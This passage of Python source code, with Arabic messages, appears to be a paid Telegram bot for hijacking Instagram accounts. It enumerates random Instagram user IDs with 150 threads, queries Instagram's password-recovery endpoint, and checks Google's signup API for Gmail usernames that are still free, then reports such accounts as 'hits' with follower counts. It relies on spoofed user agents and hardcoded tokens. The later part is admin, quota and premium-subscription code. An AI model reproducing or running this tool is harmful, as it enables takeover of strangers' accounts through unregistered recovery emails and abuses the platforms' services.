            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
                              '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            USER_AGENT_HEADER: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                           'null,0,1,"",null,null,2,2]')
        }
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print(e)
        Eizon()

Eizon()

def check_gmail(email, chat_id):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            USER_AGENT_HEADER: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats(chat_id)
            full_email = email + eizon_domain
            username, domain = full_email.split('@')
            InfoAcc(username, domain, chat_id)
        else:
            bad_email += 1
            update_stats(chat_id)
    except Exception:
        pass

def check(email, chat_id):
    global good_ig, bad_insta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        USER_AGENT_HEADER: ua,
        COOKIE_HEADER: COOKIE_VALUE,
        CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM
    }
    data = {
        SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                      json.dumps({
                          '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                          'adid': uui,
                          'guid': uui,
                          'device_id': device_id,
                          'query': email
                      })),
        IG_SIG_KEY_VERSION: '4'
    }
    response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
    if email in response:
        if eizon_domain in email:
            check_gmail(email, chat_id)
        good_ig += 1
        update_stats(chat_id)
    else:
        bad_insta += 1
        update_stats(chat_id)

def update_stats(chat_id):
    if chat_id in user_sessions:
        user_sessions[chat_id]['hits'] = hits
        user_sessions[chat_id]['bad'] = bad_insta + bad_email
        user_sessions[chat_id]['good'] = good_ig

def InfoAcc(username, domain, chat_id):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk')
    full_name = account_info.get('full_name')
    followers = account_info.get('follower_count')
    following = account_info.get('following_count')
    posts = account_info.get('media_count')
    bio = account_info.get('biography')
    account_creation_date = account_info.get('account_creation_date', 'غير محدد')
    total_hits += 1
    
    info_text = f"""
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 
═══════════════════
𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : 𝐋𝐞𝐚𝐝𝐞𝐫
═══════════════════
🇸🇾 عدد الحسابات : {total_hits}
🇸🇾 اسم المستخدم : {username}
🇸🇾 البريد الإلكتروني : {username}@{domain}
🇸🇾 عدد المتابعين : {followers}
🇸🇾 عدد المتابعات : {following}
🇸🇾 عدد المنشورات : {posts}
🇸🇾 التاريخ : N/A 
═══════════════════
@SYRIA7R | 𝐋𝐞𝐚𝐝𝐞𝐫
@LEADERSYRIA | 𝐋𝐞𝐚𝐝𝐞𝐫
"""
    with open('eizonhits.txt', 'a') as f:
        f.write(info_text + "\n")
    
    # تسجيل النتائج في قاعدة البيانات
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("UPDATE users SET search_count = search_count + 1 WHERE chat_id=?", (chat_id,))
    conn.commit()
    conn.close()
    
    bot.send_message(chat_id, info_text)

def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
        ]
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    except Exception:
        pass

def start_search(chat_id, bbk, id):
    if chat_id not in active_searches or not active_searches[chat_id]:
        active_searches[chat_id] = True
        
        # تسجيل بدء البحث
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("INSERT INTO searches VALUES (NULL, ?, ?, NULL, 0, 0, 0, ?)",
                  (chat_id, datetime.now().isoformat(), user_sessions[chat_id].get('year', 'unknown')))
        conn.commit()
        conn.close()
        
        for _ in range(150):
            Thread(target=eizon_python, args=(chat_id, bbk, id)).start()

def eizon_python(chat_id, bbk, id):
    while active_searches.get(chat_id, False):
        try:
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': int(random.randrange(bbk, id)),
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            headers = {'X-FB-LSD': data['lsd']}
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            if account and 'username' in account:
                username = account['username']
                infoinsta[username] = account
                check(username + eizon_domain, chat_id)
        except:
            pass
        time.sleep(0.1)
@bot.callback_query_handler(func=lambda call: call.data == "admin_limits")
def admin_limits_menu(call):
    chat_id = call.message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "⛔ غير مصرح لك بهذا الإجراء!")
        return
    
    markup = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("➕ تعيين حد مخصص", callback_data="set_limit")
    btn2 = types.InlineKeyboardButton("🗑 إزالة حد مخصص", callback_data="remove_limit")
    btn3 = types.InlineKeyboardButton("🔙 رجوع", callback_data="admin_back")
    markup.add(btn1, btn2, btn3)
    
    bot.edit_message_text(
        "⚙️ إدارة حدود المستخدمين:",
        chat_id,
        call.message.message_id,
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "set_limit")
def ask_for_limit_details(call):
    chat_id = call.message.chat.id
    msg = bot.send_message(chat_id, "أرسل آيدي المستخدم والحد الجديد مفصولين بمسافة (مثال: 123456789 20):")
    bot.register_next_step_handler(msg, process_set_limit)

def process_set_limit(message):
    try:
        parts = message.text.split()
        if len(parts) != 2:
            raise ValueError("يجب إدخال الآيدي والحد")
        
        user_id = int(parts[0])
        new_limit = int(parts[1])
        
        if new_limit <= 0:
            raise ValueError("الحد يجب أن يكون أكبر من الصفر")
            
        set_custom_limit(user_id, new_limit)
        
        bot.send_message(message.chat.id, f"""
✅ تم تعيين الحد بنجاح
━━━━━━━━━━━━━━━━━━
🆔 آيدي المستخدم: {user_id}
🔢 الحد الجديد: {new_limit} محاولة/ساعة
""")
        
    except ValueError as e:
        bot.send_message(message.chat.id, f"❌ خطأ في الإدخال: {str(e)}")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ حدث خطأ غير متوقع: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data == "remove_limit")
def ask_for_limit_removal(call):
    chat_id = call.message.chat.id
    msg = bot.send_message(chat_id, "أرسل آيدي المستخدم لإزالة الحد المخصص:")
    bot.register_next_step_handler(msg, process_remove_limit)

def process_remove_limit(message):
    try:
        user_id = int(message.text)
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("DELETE FROM custom_limits WHERE chat_id=?", (user_id,))
        conn.commit()
        conn.close()
        
        bot.send_message(message.chat.id, f"""
✅ تم إزالة الحد المخصص لـ {user_id}
سيستخدم الآن الحد الافتراضي (5 محاولات/ساعة)
""")
        
    except ValueError:
        bot.send_message(message.chat.id, "❌ يجب إدخال آيدي صحيح")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ حدث خطأ غير متوقع: {str(e)}")
        
# لوحة تحكم المدير
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "⛔ ليس لديك صلاحية الوصول لهذا الأمر!")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📊 إحصائيات المستخدمين", callback_data="admin_stats")
    btn2 = types.InlineKeyboardButton("📝 إرسال إشعار عام", callback_data="admin_broadcast")
    btn3 = types.InlineKeyboardButton("👤 إدارة المستخدمين", callback_data="admin_manage")
    btn4 = types.InlineKeyboardButton("💰 الوضع المدفوع", callback_data="admin_premium")
    btn5 = types.InlineKeyboardButton("🔢 إدارة الحدود", callback_data="admin_limits")  # الزر الجديد
    markup.add(btn1, btn2, btn3, btn4, btn5)
    
    bot.send_message(chat_id, "👨‍💻 لوحة تحكم المدير:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "admin_premium")
def premium_control(call):
    chat_id = call.message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "⛔ غير مصرح لك بهذا الإجراء!")
        return
    
    current_mode = get_premium_mode()
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    if current_mode:
        btn1 = types.InlineKeyboardButton("🔓 تعطيل الوضع المدفوع", callback_data="premium_disable")
        status_text = "🟢 الوضع المدفوع مفعل حالياً"
    else:
        btn1 = types.InlineKeyboardButton("🔒 تفعيل الوضع المدفوع", callback_data="premium_enable")
        status_text = "🔴 الوضع المدفوع معطل حالياً"
    
    btn2 = types.InlineKeyboardButton("➕ إضافة صلاحية مؤقتة", callback_data="premium_add")
    btn3 = types.InlineKeyboardButton("👥 عرض المستخدمين المصرح لهم", callback_data="premium_list")
    btn4 = types.InlineKeyboardButton("🔙 رجوع", callback_data="admin_back")
    
    markup.add(btn1, btn2, btn3, btn4)
    
    bot.edit_message_text(
        f"💰 إدارة الوضع المدفوع:\n\n{status_text}",
        chat_id,
        call.message.message_id,
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('premium_'))
def handle_premium_actions(call):
    chat_id = call.message.chat.id
    action = call.data.split('_')[1]
    
    if action == 'enable':
        set_premium_mode(1)
        bot.answer_callback_query(call.id, "✅ تم تفعيل الوضع المدفوع")
        premium_control(call)
        
    elif action == 'disable':
        set_premium_mode(0)
        bot.answer_callback_query(call.id, "✅ تم تعطيل الوضع المدفوع")
        premium_control(call)
        
    elif action == 'add':
        msg = bot.send_message(chat_id, "أرسل آيدي المستخدم وعدد الأيام مفصولة بمسافة (مثال: 123456789 30):")
        bot.register_next_step_handler(msg, process_premium_add)
        
    elif action == 'list':
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("SELECT chat_id, expiry_date FROM temporary_access")
        users = c.fetchall()
        conn.close()
        
        if not users:
            bot.answer_callback_query(call.id, "❌ لا يوجد مستخدمين مضافين حالياً")
            return
            
        users_list = []
        for user in users:
            user_id = user[0]
            expiry_date = datetime.fromisoformat(user[1])
            remaining_days = (expiry_date - datetime.now()).days
            users_list.append(f"🆔 {user_id} - ⏳ {remaining_days} يوم متبقي")
            
        bot.send_message(chat_id, "👥 المستخدمون المصرح لهم:\n\n" + "\n".join(users_list))

def process_premium_add(message):
    try:
        parts = message.text.split()
        if len(parts) != 2:
            raise ValueError("يجب إدخال آيدي المستخدم وعدد الأيام")
        
        user_id = int(parts[0])
        days = int(parts[1])
        
        if days <= 0:
            raise ValueError("عدد الأيام يجب أن يكون أكبر من الصفر")
            
        expiry_date = datetime.now() + timedelta(days=days)
        
        if add_temporary_access(user_id, days):
            # إرسال إشعار للمدير
            bot.send_message(message.chat.id, f"""
✅ تم منح الصلاحية بنجاح
━━━━━━━━━━━━━━━━━━
🆔 آيدي المستخدم: <code>{user_id}</code>
⏳ المدة: {days} يوم
📅 تاريخ الانتهاء: {expiry_date.strftime('%Y-%m-%d %H:%M')}
""", parse_mode='HTML')
            
            # إرسال إشعار للمستخدم
            if notify_user_access_granted(user_id, days):
                bot.send_message(message.chat.id, "📩 تم إرسال إشعار للمستخدم بنجاح")
            else:
                bot.send_message(message.chat.id, "⚠️ تم منح الصلاحية ولكن لم يتم إرسال الإشعار للمستخدم")
        else:
            bot.send_message(message.chat.id, "❌ فشل في إضافة الصلاحية، قد يكون الآيدي مضافاً مسبقاً")
            
    except ValueError as ve:
        error_msg = f"""
❌ خطأ في الإدخال: {str(ve)}
━━━━━━━━━━━━━━━━━━
📌 يرجى إرسال الرسالة بالشكل التالي:
<code>123456789 30</code>
"""
        bot.send_message(message.chat.id, error_msg, parse_mode='HTML')
        
    except Exception as e:
        print(f"Error in process_premium_add: {e}")
        bot.send_message(message.chat.id, f"⚠️ حدث خطأ غير متوقع: {str(e)}")

def notify_user_access_granted(chat_id, days):
    """إرسال إشعار للمستخدم بمنحه صلاحية"""
    try:
        expiry_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
        message = f"""
🎉 تم منحك صلاحية استخدام البوت المميز!
━━━━━━━━━━━━━━━━━━
⏳ المدة: {days} يوم
📅 تنتهي الصلاحية في: {expiry_date}

✅ يمكنك الآن استخدام جميع ميزات البوت.
🚀 ابدأ باستخدام الأمر /start
"""
        bot.send_message(chat_id, message)
        return True
    except Exception as e:
        print(f"Failed to notify user {chat_id}: {e}")
        return False
        
@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def handle_admin_commands(call):
    chat_id = call.message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "⛔ غير مصرح لك بهذا الإجراء!")
        return
    
    action = call.data.split('_')[1]
    
    if action == 'stats':
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM users WHERE is_admin=1")
        admins = c.fetchone()[0]
        
        c.execute("SELECT SUM(search_count) FROM users")
        total_searches = c.fetchone()[0] or 0
        
        stats_text = f"""
📊 إحصائيات النظام:
━━━━━━━━━━━━━━━━━━
👥 إجمالي المستخدمين: {total_users}
👨‍💻 عدد المديرين: {admins}
🔍 إجمالي عمليات البحث: {total_searches}
"""
        bot.edit_message_text(stats_text, chat_id, call.message.message_id)
        
    elif action == 'broadcast':
        msg = bot.send_message(chat_id, "📨 أرسل الرسالة التي تريد بثها لجميع المستخدمين:")
        bot.register_next_step_handler(msg, process_broadcast)
        
    elif action == 'manage':
        markup = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("➕ إضافة مدير", callback_data="admin_add")
        btn2 = types.InlineKeyboardButton("➖ إزالة مدير", callback_data="admin_remove")
        btn3 = types.InlineKeyboardButton("🔙 رجوع", callback_data="admin_back")
        markup.add(btn1, btn2, btn3)
        
        bot.edit_message_text("👨‍💻 إدارة المستخدمين:", chat_id, call.message.message_id, reply_markup=markup)

def process_broadcast(message):
    if message.chat.id not in ADMIN_IDS:
        return
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT chat_id FROM users")
    users = c.fetchall()
    
    sent = 0
    failed = 0
    for user in users:
        try:
            bot.send_message(user[0], f"📢 إشعار عام من الإدارة:\n\n{message.text}")
            sent += 1
        except:
            failed += 1
    
    bot.send_message(message.chat.id, f"""
✅ تم إرسال الإشعار بنجاح:
━━━━━━━━━━━━━━━━━━
✔️ تم الإرسال لـ: {sent} مستخدم
❌ فشل الإرسال لـ: {failed} مستخدم
""")

# إحصائيات المستخدم
@bot.message_handler(commands=['stats'])
def user_stats(message):
    chat_id = message.chat.id
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("SELECT search_count FROM users WHERE chat_id=?", (chat_id,))
    searches = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM searches WHERE chat_id=?", (chat_id,))
    total_searches = c.fetchone()[0]
    
    c.execute("SELECT SUM(hits) FROM searches WHERE chat_id=?", (chat_id,))
    total_hits = c.fetchone()[0] or 0
    
    stats_text = f"""
📊 إحصائياتك الشخصية:
━━━━━━━━━━━━━━━━━━
🔍 عدد عمليات البحث: {searches}
🎯 الحسابات الصالحة التي وجدتها: {total_hits}
"""
    bot.send_message(chat_id, stats_text)


def set_premium_mode(status):
    """تفعيل/تعطيل الوضع المدفوع"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO premium_settings (id, is_premium_mode, last_updated) VALUES (1, ?, ?)",
              (status, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_premium_mode():
    """الحصول على حالة الوضع المدفوع"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT is_premium_mode FROM premium_settings WHERE id=1")
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def add_temporary_access(chat_id, days):
    """إضافة صلاحية مؤقتة لمستخدم"""
    expiry_date = (datetime.now() + timedelta(days=days)).isoformat()
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    try:
        c.execute("INSERT OR REPLACE INTO temporary_access (chat_id, expiry_date) VALUES (?, ?)",
                  (chat_id, expiry_date))
        conn.commit()
        return True
    except:
        return False
    finally:
        conn.close()

def check_user_access(chat_id):
    """فحص صلاحية المستخدم"""
    if chat_id in ADMIN_IDS:
        return True
    
    if not get_premium_mode():
        return True
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT expiry_date FROM temporary_access WHERE chat_id=?", (chat_id,))
    result = c.fetchone()
    conn.close()
    
    if result:
        expiry_date = datetime.fromisoformat(result[0])
        return datetime.now() < expiry_date
    return False
    
# تشغيل البوت
while True:
    try:
        bot.polling(none_stop=True, interval=1, timeout=30)
    except Exception as e:
        print(f"Error occurred: {e}")